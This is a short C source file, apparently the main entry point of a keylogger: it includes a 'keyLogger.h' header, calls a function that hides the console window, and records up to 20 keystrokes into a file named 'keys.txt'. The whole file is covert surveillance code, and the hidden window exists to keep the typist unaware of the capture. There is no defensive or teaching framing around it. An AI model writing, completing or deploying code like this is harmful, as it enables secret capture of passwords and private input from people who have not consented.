#include "keyLogger.h"

#define OUTPUT_FILE_NAME "keys.txt"


errno_t main(void)
{
    hideConsoleWindow();
    size_t const maximumKeys = 20; // Change as needed

    return logKeys(OUTPUT_FILE_NAME, maximumKeys);
}
